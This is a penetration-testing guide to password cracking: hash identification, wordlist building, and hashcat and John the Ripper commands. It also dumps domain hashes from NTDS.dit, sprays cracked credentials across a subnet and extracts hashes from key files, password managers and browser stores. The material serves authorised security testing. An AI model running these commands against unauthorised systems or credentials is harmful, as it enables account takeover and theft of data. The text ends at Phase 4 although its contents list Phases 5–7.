# Password Cracking Methodology

The go-to reference for hash identification, offline cracking, and online brute-force/spraying attacks during penetration tests. Covers hashcat, John the Ripper, wordlist preparation, and per-hash-type strategies.

For credential harvesting and initial access, see [Enumeration methodology](enumeration-methodology.md), [Windows methodology](windows-methodology.md), [Linux methodology](linux-methodology.md), and [Active Directory methodology](active-directory-methodology.md).

> **Hash sources by context:** NTLM/NetNTLMv2 from [Enumeration methodology](enumeration-methodology.md) (Responder, secretsdump), Kerberos hashes from [Active Directory methodology](active-directory-methodology.md) (Kerberoast, AS-REP), Linux shadow hashes from [Linux methodology](linux-methodology.md), SAM/DCC2 hashes from [Windows methodology](windows-methodology.md).

---

## Table of Contents

- [Phase 1: Hash Identification](#phase-1-hash-identification)
- [Phase 2: Wordlist Preparation](#phase-2-wordlist-preparation)
- [Phase 3: Hashcat Attacks](#phase-3-hashcat-attacks)
- [Phase 4: John the Ripper](#phase-4-john-the-ripper)
- [Phase 5: Cracking Strategies by Hash Type](#phase-5-cracking-strategies-by-hash-type)
- [Phase 6: Online Attacks (Brute-Force / Spraying)](#phase-6-online-attacks-brute-force--spraying)
- [Phase 7: Cryptographic Recovery (Non-Hash)](#phase-7-cryptographic-recovery-non-hash)
- [Quick Reference Tables](#quick-reference-tables)

---

## Phase 1: Hash Identification

**Goal:** Determine the hash algorithm and the correct hashcat mode / john format before cracking.

### 1.1 Identification Tools

```bash
# hashid — fast, broad detection (may return multiple candidates)
hashid '<HASH>'
hashid -m '<HASH>'      # Include hashcat mode in output

# hash-identifier — interactive, built into Kali
hash-identifier

# hashcat — built-in identifier (v6.2.6+)
hashcat --identify hash.txt

# haiti — modern, shows hashcat mode + john format together
haiti '<HASH>'
```

### 1.2 Common Hash Format Reference

| Hash Type | Example Hash (truncated) | Identifier Prefix | Length |
|---|---|---|---|
| MD5 | `5d41402abc4b2a76b9719d911017c592` | — | 32 hex |
| SHA-1 | `aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d` | — | 40 hex |
| SHA-256 | `2cf24dba5fb0a30e26e83b2ac5b9e29e...` | — | 64 hex |
| SHA-512 | `cf83e1357eefb8bdf1542850d66d8007...` | — | 128 hex |
| NTLM | `32ed87bdb5fdc5e9cba88547376818d4` | — | 32 hex |
| NetNTLMv2 | `user::DOMAIN:challenge:hmac:blob` | — | Variable |
| bcrypt | `$2b$12$LJ3m4ys3Lg...` | `$2b$` / `$2a$` | 60 chars |
| Linux MD5 crypt | `$1$salt$hash` | `$1$` | Variable |
| Linux SHA-256 crypt | `$5$rounds=5000$salt$hash` | `$5$` | Variable |
| Linux SHA-512 crypt | `$6$rounds=5000$salt$hash` | `$6$` | Variable |
| Linux yescrypt | `$y$j9T$salt$hash` | `$y$` | Variable |
| MSCache2 / DCC2 | `$DCC2$10240#user#hash` | `$DCC2$` | Variable |
| Kerberoast TGS-REP (RC4) | `$krb5tgs$23$*user$realm$spn*$...` | `$krb5tgs$23$` | Variable |
| Kerberoast TGS-REP (AES-256)| `$krb5tgs$18$*user$realm$spn*$...` | `$krb5tgs$18$` | Variable |
| AS-REP Roast | `$krb5asrep$23$user@DOMAIN:...` | `$krb5asrep$23$` | Variable |
| Kerberos 5 AES-256 | `$krb5pa$18$user$realm$hash` | `$krb5pa$18$` | Variable |
| KeePass KDBX | `$keepass$*2*...` | `$keepass$` | Variable |
| MSSQL 2012+ | `0x0200...` | `0x0200` | Variable |
| MySQL 4.1+ | `*6C8989366EAF6A... ` | `*` | 41 chars |
| PostgreSQL MD5 | `md5<32hex>` | `md5` | 35 chars |

### 1.3 Hashcat Mode Reference (Pentesting)

| Mode | Hash Type | Notes |
|---|---|---|
| 0 | MD5 | Raw MD5 |
| 100 | SHA-1 | Raw SHA-1 |
| 131 | MSSQL (2000) | 0x0100 prefix |
| 132 | MSSQL (2005) | 0x0100 prefix |
| 300 | MySQL 4.1+ | `*` prefix stripped |
| 500 | MD5 crypt (`$1$`) | Linux /etc/shadow |
| 1000 | NTLM | Windows SAM / secretsdump |
| 1100 | MSCache v1 (DCC) | Domain cached creds v1 |
| 1400 | SHA-256 | Raw SHA-256 |
| 1450 | HMAC-SHA256 (key = $pass) | |
| 1460 | HMAC-SHA256 (key = $salt) | |
| 1500 | DES crypt | |
| 1700 | SHA-512 | Raw SHA-512 |
| 1731 | MSSQL (2012, 2014) | 0x0200 prefix |
| 1800 | SHA-512 crypt (`$6$`) | Linux /etc/shadow (common) |
| 2100 | MSCache v2 (DCC2) | Domain cached creds v2, very slow |
| 3000 | LM | Legacy Windows |
| 3200 | bcrypt (`$2a$`/`$2b$`) | Very slow, found in web apps |
| 5500 | NetNTLMv1 | Responder captures |
| 5600 | NetNTLMv2 | Responder captures (most common) |
| 7500 | Kerberos 5 AS-REQ Pre-Auth (RC4) | |
| 7900 | Drupal 7 | `$S$` prefix |
| 8600 | Lotus Notes/Domino 5 | |
| 9400 | MS Office 2007 | |
| 9500 | MS Office 2010 | |
| 9600 | MS Office 2013+ | |
| 10000 | Django PBKDF2-SHA256 | |
| 10500 | PDF 1.4-1.6 | |
| 10600 | PDF 1.7 L3 | |
| 10700 | PDF 1.7 L8 | |
| 11300 | Bitcoin/Litecoin wallet | |
| 11600 | 7-Zip | |
| 12500 | RAR3-hp | |
| 13000 | RAR5 | |
| 13100 | Kerberos 5 TGS-REP (RC4) | Kerberoast |
| 13400 | KeePass KDBX 1/2 | |
| 15700 | Ethereum wallet (SCRYPT) | |
| 16600 | Electrum wallet | |
| 17200 | PKZIP (Compressed) | |
| 17210 | PKZIP (Uncompressed) | |
| 17300 | SHA3-224 | |
| 17400 | SHA3-256 | |
| 17600 | SHA3-512 | |
| 18200 | Kerberos 5 AS-REP (RC4) | AS-REP Roast |
| 18300 | Apple Secure Notes | |
| 19600 | Kerberos 5 TGS-REP (AES-128) | |
| 19700 | Kerberos 5 TGS-REP (AES-256) | |
| 19800 | Kerberos 5 Pre-Auth (AES-128) | |
| 19900 | Kerberos 5 Pre-Auth (AES-256) | |
| 22000 | WPA-PBKDF2-PMKID+EAPOL | Wi-Fi |
| 22100 | BitLocker | |
| 22911 | RSA/DSA/EC/OpenSSH Private Key ($0$) | |
| 22921 | RSA/DSA/EC/OpenSSH Private Key ($6$) | |
| 22931 | RSA/DSA/EC/OpenSSH Private Key ($1, $3$) | |
| 23100 | Apple Keychain | |
| 25300 | MS Office 2016 Sheet Protection | |
| 26000 | Mozilla key3.db | |
| 26100 | Mozilla key4.db | |
| 27400 | VMware VMX (PBKDF2-HMAC-SHA1+AES-256) | |
| 28100 | Windows Hello PIN/Password | |

[↑ Top](#password-cracking-methodology)

---

## Phase 2: Wordlist Preparation

**Goal:** Build targeted, efficient wordlists before launching any cracking attack.

### 2.1 Standard Wordlists on Kali

```bash
# rockyou.txt — the default starting point (14 million passwords)
/usr/share/wordlists/rockyou.txt

# Decompress rockyou if not already extracted
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# SecLists — comprehensive collection
/usr/share/seclists/Passwords/
/usr/share/seclists/Passwords/Leaked-Databases/
/usr/share/seclists/Passwords/Common-Credentials/
/usr/share/seclists/Passwords/Default-Credentials/
/usr/share/seclists/Usernames/
```

| Wordlist | Path | Size | Use Case |
|---|---|---|---|
| rockyou.txt | `/usr/share/wordlists/rockyou.txt` | ~14M lines | General cracking |
| darkweb2017-top10000 | `/usr/share/seclists/Passwords/darkweb2017-top10000.txt` | 10K lines | Quick spray |
| xato-net-10-million | `/usr/share/seclists/Passwords/xato-net-10-million-passwords.txt` | 5.2M lines | Extended cracking |
| common-passwords-win | `/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt` | 1M lines | Mid-range |
| best1050 | `/usr/share/seclists/Passwords/Common-Credentials/best1050.txt` | 1050 lines | Fast spray |
| seasons/months combos | Custom | Variable | Targeted spray |

### 2.2 Custom Wordlist Generation

```bash
# cewl — scrape target website for words (company terms, names, products)
cewl http://<TARGET> -d 3 -m 5 -w cewl_wordlist.txt
# -d 3 = crawl depth 3
# -m 5 = minimum word length 5
# With authentication
cewl http://<TARGET> -d 3 -m 5 --auth_type basic --auth_user <USER> --auth_pass <PASSWORD> -w cewl_wordlist.txt

# Include email addresses from the site
cewl http://<TARGET> -d 3 -m 5 -e --email_file emails.txt -w cewl_wordlist.txt

# cupp — interactive profiling (name, DOB, pet, partner, company)
cupp -i

# username-anarchy — generate username permutations from names
username-anarchy --input-file names.txt --select-format first,flast,first.last,firstl > usernames.txt
username-anarchy "John Smith" --select-format first,last,flast,first.last,firstl

# Create a names file from enumerated users
echo -e "John Smith\nJane Doe" > names.txt
username-anarchy --input-file names.txt > usernames.txt
```

### 2.3 Keyword-Based Generation

```bash
# kwprocessor — generate keyboard walk patterns
kwp basechars/full.base keymaps/en-us.keymap routes/2-to-16-max-3-direction-changes.route -o keyboard_walks.txt

# hashcat --stdout — apply rules to a wordlist without cracking (generate candidates)
hashcat --stdout -r /usr/share/hashcat/rules/best64.rule wordlist.txt > expanded_wordlist.txt

# Generate Season+Year combos (common AD passwords)
for season in Spring Summer Fall Winter Autumn; do
    for year in $(seq 2020 2026); do
        echo "${season}${year}"
        echo "${season}${year}!"
        echo "${season}${year}@"
    done
done > seasonal_passwords.txt

# Generate Company+common suffixes
COMPANY="Acme"
for suffix in 1 123 2024 2025 2026 ! @ 1! 123! ; do
    echo "${COMPANY}${suffix}"
    echo "${COMPANY,,}${suffix}"   # lowercase
    echo "${COMPANY^^}${suffix}"   # uppercase
done > company_passwords.txt

# Generate Month+Year combos
for month in January February March April May June July August September October November December; do
    for year in $(seq 2020 2026); do
        echo "${month}${year}"
        echo "${month}${year}!"
    done
done > monthly_passwords.txt
```

### 2.4 Wordlist Processing

```bash
# Remove duplicates
sort -u wordlist.txt -o wordlist_unique.txt

# Filter by length (e.g., 8-20 characters — common password policy)
awk 'length >= 8 && length <= 20' wordlist.txt > wordlist_filtered.txt

# Merge multiple wordlists and dedupe
cat wordlist1.txt wordlist2.txt wordlist3.txt | sort -u > merged_wordlist.txt

# Remove blank lines
sed '/^$/d' wordlist.txt > wordlist_clean.txt

# Convert to lowercase
tr '[:upper:]' '[:lower:]' < wordlist.txt > wordlist_lower.txt

# Strip leading/trailing whitespace
sed 's/^[[:space:]]*//;s/[[:space:]]*$//' wordlist.txt > wordlist_trimmed.txt

# Count lines / estimate cracking time
wc -l wordlist.txt

# Extract passwords from potfile for reuse (password reuse across services)
cut -d: -f2- ~/.local/share/hashcat/hashcat.potfile | sort -u > cracked_passwords.txt
```

[↑ Top](#password-cracking-methodology)

---

## Phase 3: Hashcat Attacks

**Goal:** Crack hashes offline using GPU-accelerated attacks.

### 3.0 First-Attack Defaults (RTX 4050-class GPU, copy-paste)

**Run these in order. Stop the moment something cracks.** Replace `<HASH>` with the hash file. Mode is fixed per recipe — no `<MODE>` placeholder.

```bash
# === FAST HASHES — full rockyou + best64 in one shot. <30 sec. ===

# NTLM (Windows local hashes, secretsdump output)
hashcat -m 1000 <HASH> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# NetNTLMv2 (Responder captures)
hashcat -m 5600 <HASH> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Kerberos AS-REP (GetNPUsers output)
hashcat -m 18200 <HASH> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Kerberoast TGS (GetUserSPNs output)
hashcat -m 13100 <HASH> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# MD5
hashcat -m 0 <HASH> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# SHA1
hashcat -m 100 <HASH> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# SHA256
hashcat -m 1400 <HASH> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# bcrypt $2a$ / $2b$ / $2y$  — slow even on GPU; head-first
hashcat -m 3200 <HASH> /usr/share/wordlists/rockyou.txt --username

# === IF best64 MISSED — escalate to OneRule. 5-15 min on fast hashes. ===

hashcat -m <MODE> <HASH> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule

# === IF OneRule MISSED — context-aware list (build first, see §2.2 / spray_t1.txt) ===

hashcat -m <MODE> <HASH> spray_t1.txt -r /usr/share/hashcat/rules/best64.rule

# === IF still missed AND password looks structured — mask attack ===

# Common AD pattern: Capital + 5-7 lowercase + 2-4 digits + 0-1 special
hashcat -m <MODE> <HASH> -a 3 '?u?l?l?l?l?l?d?d?d?d'              # Welcome2025
hashcat -m <MODE> <HASH> -a 3 '?u?l?l?l?l?l?l?l?d?s'              # Password1!
hashcat -m <MODE> <HASH> -a 3 -a 6 wordlist.txt '?d?d?d?d'        # cewl + 4 digits
```

**For slow hashes (bcrypt 3200, KeePass 13400, LUKS 14600, Office 9400+):** skip best64 on the first pass. Run rockyou bare, then `top10K + best64`, then escalate. Rules on bcrypt = hours.

```bash
# Slow-hash escalation
head -n 1000000 /usr/share/wordlists/rockyou.txt > rockyou-1m.txt
hashcat -m 3200 <HASH> rockyou-1m.txt                              # naked
hashcat -m 3200 <HASH> rockyou-1m.txt -r /usr/share/hashcat/rules/best64.rule
```

**Always-on flags for the 4050:**

```bash
# Append to any command above for max throughput on a 4050 mobile
-O -w 3 --status --status-timer=10
```

---

### 3.1 Dictionary Attack (Attack Mode 0)

```bash
# Basic dictionary attack
hashcat -m <MODE> -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# With rules for mangling (most effective single attack)
hashcat -m <MODE> -a 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# With multiple rule files (applied sequentially — rule1 then rule2)
hashcat -m <MODE> -a 0 hash.txt wordlist.txt -r rules1.rule -r rules2.rule

# With username:hash format
hashcat -m <MODE> -a 0 --username hash.txt /usr/share/wordlists/rockyou.txt

# Output cracked results to file
hashcat -m <MODE> -a 0 hash.txt wordlist.txt -o cracked.txt
```

### 3.2 Combinator Attack (Attack Mode 1)

```bash
# Combine two wordlists — every word from list1 + every word from list2
hashcat -m <MODE> -a 1 hash.txt wordlist1.txt wordlist2.txt

# Use combinator utility to preview combinations
/usr/lib/hashcat-utils/combinator.bin wordlist1.txt wordlist2.txt | head -20
```

### 3.3 Mask / Brute-Force Attack (Attack Mode 3)

```bash
# Brute-force with mask
hashcat -m <MODE> -a 3 hash.txt '?a?a?a?a?a?a'

# Example: 8-char password starting with uppercase, ending with digit + special
hashcat -m <MODE> -a 3 hash.txt '?u?l?l?l?l?l?d?s'

# Incremental length (1 to 8 chars)
hashcat -m <MODE> -a 3 hash.txt '?a?a?a?a?a?a?a?a' --increment --increment-min 1 --increment-max 8

# Custom charset: first char = uppercase or digit, rest = lowercase or digit
hashcat -m <MODE> -a 3 hash.txt -1 '?u?d' -2 '?l?d' '?1?2?2?2?2?2'
```

**Charset Reference:**

| Placeholder | Character Set | Description |
|---|---|---|
| `?l` | `a-z` | Lowercase letters |
| `?u` | `A-Z` | Uppercase letters |
| `?d` | `0-9` | Digits |
| `?s` | ` !"#$%&'()*+,-./:;<=>?@[\]^_{|}~` | Special characters |
| `?a` | `?l?u?d?s` | All printable ASCII |
| `?b` | `0x00-0xff` | Full byte range |
| `-1 <set>` | Custom | User-defined charset 1 |
| `-2 <set>` | Custom | User-defined charset 2 |
| `-3 <set>` | Custom | User-defined charset 3 |
| `-4 <set>` | Custom | User-defined charset 4 |

**Common Masks:**

| Mask | Pattern | Example Match |
|---|---|---|
| `?u?l?l?l?l?l?d?d` | Ullllldd | `Spring24` |
| `?u?l?l?l?l?l?l?d?d?s` | Ullllllldd! | `Welcome01!` |
| `?u?l?l?l?l?l?d?d?d?d` | Ulllllddddd | `Winter2025` |
| `?d?d?d?d?d?d` | 6 digits | `123456` |
| `?d?d?d?d?d?d?d?d` | 8 digits | `20250415` |
| `?u?l?l?l?l?l?l?l?d?s` | Ulllllllld! | `Password1!` |
| `?l?l?l?l?l?l?l?l` | 8 lowercase | `password` |

### 3.4 Hybrid Attacks (Attack Modes 6 and 7)

```bash
# Mode 6: wordlist + mask (append mask to each word)
# Example: each word from list + 4 digits
hashcat -m <MODE> -a 6 hash.txt wordlist.txt '?d?d?d?d'

# Example: word + digit + special
hashcat -m <MODE> -a 6 hash.txt wordlist.txt '?d?s'

# Mode 7: mask + wordlist (prepend mask to each word)
# Example: 2 digits + each word from list
hashcat -m <MODE> -a 7 hash.txt '?d?d' wordlist.txt

# Example: year prepended
hashcat -m <MODE> -a 7 hash.txt '20?d?d' wordlist.txt
```

### 3.5 Rule-Based Attacks

```bash
# Use best64 — fast, good hit rate
hashcat -m <MODE> -a 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# OneRuleToRuleThemAll — comprehensive, slower but higher success
hashcat -m <MODE> -a 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule

# dive.rule — very large rule set
hashcat -m <MODE> -a 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/dive.rule

# d3ad0ne.rule — classic large coverage
hashcat -m <MODE> -a 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/d3ad0ne.rule

# rockyou-30000.rule — huge expansion
hashcat -m <MODE> -a 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
```

**Top Rules Ranked by Effectiveness:**

| Rule File | Candidates per Word | Speed | Hit Rate |
|---|---|---|---|
| `best64.rule` | 64 | Fast | Good baseline |
| `OneRuleToRuleThemAll.rule` | ~52K | Slow | Excellent |
| `dive.rule` | ~99K | Very Slow | Excellent |
| `d3ad0ne.rule` | ~34K | Slow | Very Good |
| `rockyou-30000.rule` | ~30K | Slow | Very Good |
| `toggles5.rule` | ~31 | Fast | Niche |

**Common Rule Syntax:**

| Rule | Description | Example |
|---|---|---|
| `:` | Pass-through (no modification) | `password` → `password` |
| `l` | Lowercase all | `Password` → `password` |
| `u` | Uppercase all | `password` → `PASSWORD` |
| `c` | Capitalize first, lower rest | `password` → `Password` |
| `C` | Lowercase first, upper rest | `password` → `pASSWORD` |
| `t` | Toggle case all | `password` → `PASSWORD` |
| `$X` | Append character X | `pass` + `$1` → `pass1` |
| `^X` | Prepend character X | `pass` + `^1` → `1pass` |
| `r` | Reverse | `password` → `drowssap` |
| `d` | Duplicate | `pass` → `passpass` |
| `sXY` | Replace X with Y | `pass` + `sa@` → `p@ss` |
| `[` | Delete first char | `password` → `assword` |
| `]` | Delete last char | `password` → `passwor` |

### 3.6 Common Hashcat Flags

```bash
# Force run (ignore warnings — use only when needed, e.g. VM without GPU)
hashcat --force

# Optimized kernels — faster but limits password length to 31 chars
hashcat -O

# Workload profile: 1=low, 2=default, 3=high, 4=nightmare (may freeze desktop)
hashcat -w 3

# Session management — name the session for pause/resume
hashcat --session <NAME> -m <MODE> hash.txt wordlist.txt
hashcat --restore --session <NAME>

# Show already-cracked hashes from potfile
hashcat -m <MODE> hash.txt --show

# Show cracked with username:password format
hashcat -m <MODE> --username hash.txt --show

# Custom potfile path
hashcat --potfile-path ./project.potfile -m <MODE> hash.txt wordlist.txt

# Output cracked hashes to file
hashcat -m <MODE> hash.txt wordlist.txt -o cracked.txt --outfile-format 2
# --outfile-format: 1=hash:plain, 2=plain only, 3=hex:plain, etc.

# Status display during cracking
hashcat --status --status-timer 10

# Limit GPU temp
hashcat --hwmon-temp-abort=90

# Benchmark a specific algorithm before running long jobs
hashcat -b -m <MODE>
```

> **Slow-hash warning:** modes like `-m 2100` (DCC2 / MS-Cache 2), `-m 3200` (bcrypt), `-m 1800` (sha512crypt), and `-m 7400` (sha256crypt) run at thousands of H/s on a 4090 — not billions. Use small targeted wordlists (`top10k`, `seclists Common-Credentials`) plus rules; do **not** start with the full rockyou unless you have days to spare.

### 3.7 Output Parsing and Potfile Management

```bash
# Show all cracked hashes from default potfile
hashcat -m <MODE> hash.txt --show

# Show cracked with user:pass format
hashcat -m <MODE> --username hash.txt --show | awk -F: '{print $1 ":" $NF}'

# Extract just passwords from potfile
cut -d: -f2- ~/.local/share/hashcat/hashcat.potfile | sort -u

# Clear potfile (start fresh)
> ~/.local/share/hashcat/hashcat.potfile

# Show uncracked (left) hashes
hashcat -m <MODE> hash.txt --left
```

### 3.8 PRINCE / Markov / Toggle Advanced Attacks

When pure dictionary (`-a 0`), pure mask (`-a 3`), and the hybrid attacks (`-a 6` / `-a 7` in §3.4) miss, statistically-driven candidate generation often picks up what rule-mangled rockyou won't.

```bash
# Combinator (-a 1) — every word in dict1 concatenated with every word in dict2
hashcat -a 1 -m <MODE> hashes.txt left.txt right.txt

# PRINCE attack — chains words from a single wordlist into longer candidates
# https://github.com/hashcat/princeprocessor
pp64.bin rockyou.txt | hashcat -a 0 -m <MODE> hashes.txt
pp64.bin --elem-cnt-min=2 --elem-cnt-max=4 rockyou.txt | hashcat -a 0 -m <MODE> hashes.txt

# Toggle-case rule — try every case permutation of cracked or candidate words
hashcat -a 0 -m <MODE> hashes.txt wordlist.txt -r /usr/share/hashcat/rules/toggles1.rule
hashcat -a 0 -m <MODE> hashes.txt wordlist.txt -r /usr/share/hashcat/rules/toggles5.rule

# Markov / statsprocessor — generate candidates by frequency model rather than mask
# https://github.com/hashcat/statsprocessor
# 1) build a Markov stats file from existing cracked passwords, then drive sp64
hashcat --stdout -a 0 cracked.txt | sp64.bin --pw-min=8 --pw-max=12 hashcat.hcstat2 | hashcat -a 0 -m <MODE> hashes.txt
# 2) or use the bundled hashcat.hcstat2
sp64.bin --pw-min=8 --pw-max=10 /usr/share/hashcat/hashcat.hcstat2 | hashcat -a 0 -m <MODE> hashes.txt

# Combine: best64 rules on top of a hybrid attack
hashcat -a 6 -m <MODE> hashes.txt rockyou.txt ?d?d -r /usr/share/hashcat/rules/best64.rule
```

### 3.9 Quick-Win Patterns (Default Escalation Ladder)

Reference patterns to layer on top of the §3.0 escalation ladder once rockyou + best64 / OneRule / cewl have all missed. Stop the moment a hash cracks.

```bash
# === STEP 5: mask attacks for structured passwords ===
# 8 chars: Capital + 5 lowercase + 2 digits  (e.g. Welcom25)
hashcat -m <MODE> <HASH> -a 3 '?u?l?l?l?l?l?d?d'
# 9 chars: Capital + 6 lowercase + 2 digits  (e.g. Welcome25)
hashcat -m <MODE> <HASH> -a 3 '?u?l?l?l?l?l?l?d?d'
# 10 chars: Capital + 6 lowercase + 2 digits + 1 special  (e.g. Welcome25!)
hashcat -m <MODE> <HASH> -a 3 '?u?l?l?l?l?l?l?d?d?s'
# Year-suffix patterns
hashcat -m <MODE> <HASH> -a 3 '?u?l?l?l?l?l?l20?d?d'      # Welcome2025
hashcat -m <MODE> <HASH> -a 3 '?u?l?l?l?l?l?l20?d?d?s'    # Welcome2025!

# === STEP 6: username-as-password (very common in fresh AD enrollments) ===
# Build user-as-pass list from extracted users
awk -F: '{print $1}' users.txt > username_list.txt
hashcat -m <MODE> <HASH> username_list.txt --username
hashcat -m <MODE> <HASH> username_list.txt --username -r /usr/share/hashcat/rules/best64.rule
# Hashcat built-in rule that derives passwords from usernames (if present in distro)
hashcat -m <MODE> <HASH> username_list.txt -r /usr/share/hashcat/rules/unix-ninja-leetspeak.rule
```

**Common cleartext patterns to try first (paste into a list and run before any rule attack):**

```bash
cat <<'EOF' > common_lazy.txt
Password1
Password1!
Password123
Password123!
P@ssw0rd
P@ssw0rd1
P@ssw0rd123
Welcome1
Welcome1!
Welcome123
Welcome123!
Changeme1
Changeme123
Changeme123!
Summer2024!
Summer2025!
Summer2026!
Spring2024!
Spring2025!
Spring2026!
Fall2024!
Fall2025!
Winter2024!
Winter2025!
Winter2026!
January2025!
April2025!
August2025!
Qwerty123!
Letmein1
Letmein123
Admin123!
Admin@123
Company2024!
Company2025!
Company2026!
EOF
hashcat -m <MODE> <HASH> common_lazy.txt
```

**Per-domain CeWL wordlist with substitution rules:**

```bash
# Crawl target site, depth 3, min word length 4
cewl http://<TARGET> -d 3 -m 4 -w cewl_<TARGET>.txt

# Apply common substitutions: a→@, e→3, i→1, o→0, s→$, append year/!/123
hashcat -m <MODE> <HASH> cewl_<TARGET>.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m <MODE> <HASH> cewl_<TARGET>.txt -r /usr/share/hashcat/rules/leetspeak.rule
hashcat -m <MODE> <HASH> cewl_<TARGET>.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule

# Hybrid: each cewl word + 4 digits (e.g. Acme2025)
hashcat -m <MODE> <HASH> -a 6 cewl_<TARGET>.txt '20?d?d'
hashcat -m <MODE> <HASH> -a 6 cewl_<TARGET>.txt '20?d?d?s'
```

---

### 3.10 NTDS.dit Cracking Workflow

Full domain hash extraction → hashcat → user:plaintext mapping. Pair with [Active Directory methodology - Phase 10.1: DCSync](active-directory-methodology.md#101-dcsync).

```bash
# 1) Extract NTLM hashes from NTDS.dit + SYSTEM hive (offline)
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL -outputfile domain_dump
# Produces: domain_dump.ntds (user:rid:lm:nt:::), .secrets, .cached

# 2) Crack — keep username mapping with --username
hashcat -m 1000 domain_dump.ntds /usr/share/wordlists/rockyou.txt --username -o cracked.txt
hashcat -m 1000 domain_dump.ntds rockyou.txt --username -r /usr/share/hashcat/rules/best64.rule -o cracked.txt

# 3) Show user:plaintext mapping (post-crack)
hashcat -m 1000 domain_dump.ntds --show --username | awk -F: '{print $1":"$NF}' | tee user_pass.txt

# 4) Pivot — spray cracked creds back across the network
netexec smb <SUBNET>/24 -u user_pass.txt --no-bruteforce --continue-on-success

# Helper — pull only Domain Admins for priority cracking
grep -F -f <(awk -F: '{print $1}' da_users.txt) domain_dump.ntds > da_hashes.ntds
hashcat -m 1000 da_hashes.ntds rockyou.txt --username -o cracked_da.txt
```

[↑ Top](#password-cracking-methodology)

---

## Phase 4: John the Ripper

**Goal:** Crack hashes using CPU-based attacks, especially for formats hashcat does not support or for file-to-hash extraction.

### 4.1 Basic Usage

```bash
# Wordlist mode
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Wordlist + rules (John's default mangling)
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 hash.txt

# Incremental mode (brute-force)
john --incremental hash.txt

# Specify format explicitly
john --format=<FORMAT> --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Show cracked passwords
john --show hash.txt
john --show --format=<FORMAT> hash.txt

# Show cracked count
john --show hash.txt | tail -1

# List supported formats
john --list=formats | tr ',' '\n' | grep -i '<KEYWORD>'
```

### 4.2 File-to-Hash Extraction (x2john)

```bash
# SSH private key (passphrase protected)
ssh2john id_rsa > ssh_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.txt

# KeePass database
keepass2john Database.kdbx > keepass_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt keepass_hash.txt
# For hashcat: strip "Database:" prefix, use -m 13400
grep -oP '\$keepass\$.*' keepass_hash.txt > keepass_hashcat.txt
hashcat -m 13400 keepass_hashcat.txt /usr/share/wordlists/rockyou.txt

# ZIP file
zip2john protected.zip > zip_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt
# For hashcat: extract PKZIP hash, use -m 17200 or 17210
grep -oP '\$pkzip2\$.*\$\/pkzip2\$' zip_hash.txt > zip_hashcat.txt

# RAR file
rar2john protected.rar > rar_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt rar_hash.txt

# 7-Zip
7z2john protected.7z > 7z_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt 7z_hash.txt

# PDF
pdf2john protected.pdf > pdf_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt pdf_hash.txt

# MS Office (Word, Excel, PowerPoint)
office2john protected.docx > office_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt office_hash.txt

# GPG private key
gpg2john private.key > gpg_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt gpg_hash.txt

# BitLocker
bitlocker2john -i /dev/sdb1 > bitlocker_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt bitlocker_hash.txt

# PFX / PKCS#12 certificate
pfx2john certificate.pfx > pfx_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt pfx_hash.txt

# Ethereum wallet
ethereum2john wallet.json > eth_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt eth_hash.txt

# Mozilla Firefox passwords (key4.db / logins.json)
mozilla2john key4.db > mozilla_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt mozilla_hash.txt
```

### 4.3 John vs Hashcat Comparison

| Feature | John the Ripper | Hashcat |
|---|---|---|
| Acceleration | CPU | GPU (CUDA/OpenCL) |
| Speed (fast hashes) | Slower | Much faster |
| Speed (slow hashes) | Comparable | Faster with GPU |
| File extraction | Built-in (x2john) | Needs external tools |
| Format detection | Automatic | Manual (`-m` required) |
| Session restore | `--restore` | `--session` / `--restore` |
| Rule syntax | John rules | Hashcat rules (different syntax) |
| Best for | File formats, CPU-only boxes | Large hash lists, GPU rigs |

**When to use John:** SSH keys, KeePass, ZIP/RAR/7z files, PDF, Office docs, or when no GPU is available.
**When to use Hashcat:** NTLM, NetNTLMv2, Kerberos, bcrypt, or when GPU acceleration matters.

### 4.4 John Format Reference

| Hash Type | John Format | Hashcat Mode |
|---|---|---|
| NTLM | `nt` | 1000 |
| NetNTLMv2 | `netntlmv2` | 5600 |
| MD5 | `raw-md5` | 0 |
| SHA-1 | `raw-sha1` | 100 |
| SHA-256 | `raw-sha256` | 1400 |
| SHA-512 | `raw-sha512` | 1700 |
| SHA-512 crypt | `sha512crypt` | 1800 |
